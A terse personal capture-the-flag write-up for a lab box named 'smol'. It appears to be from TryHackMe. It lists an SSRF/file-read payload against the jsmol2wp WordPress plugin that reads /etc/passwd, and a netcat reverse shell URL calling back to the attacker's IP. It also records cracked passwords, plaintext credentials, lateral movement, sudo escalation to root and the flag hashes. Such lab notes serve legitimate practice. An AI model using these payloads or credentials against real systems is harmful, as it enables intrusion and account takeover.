my ip     : 10.2.3.159
target ip : 10.10.90.197

www.smol.thm   => added to /etc/hosts

---
```
SSRF PAYLOAD :

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-cron.php

SSRF PAYLOAD TO READ /etc/passwd :

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=file:///etc/passwd

Vulnerable file :

www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```
---

Wordpress :

   User: wpuser
   Pass: kbLSF2Vop#lw3rjDZ629*Z%G


users and passwords cracked from the hashes found in the backup.sql file:
```
(john --wordlist=rockyou.txt <hashed password file>)

think 
xavi
diego    => password cracked = sandiegocalifornia
gege	 => password cracked = hero_gege@hotmail.com (Doesnt work?)
```

---

Reverse shell payload: 
```
http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%2010.2.3.159%209001%20-e%20/bin/bash
```

---

Connect to diego user with his cracked password

Connect to think with his private ssh key

Connect to gege with `su gege`

We found the file "wordpress.old.zip"

```
=> zip2john the file => john the hash => again this password : hero_gege@hotmail.com
```
---

We can now unzip the file and find xavi's password in wp-config.php : P@ssw0rdxavi@

su xavi => sudo -l => all commands are run as sudo => sudo su => root

user.txt = 45edaec653ff9ee06236b7ce72b86963
root.txt = bf89ea3ea01992353aef1f576214d4e4
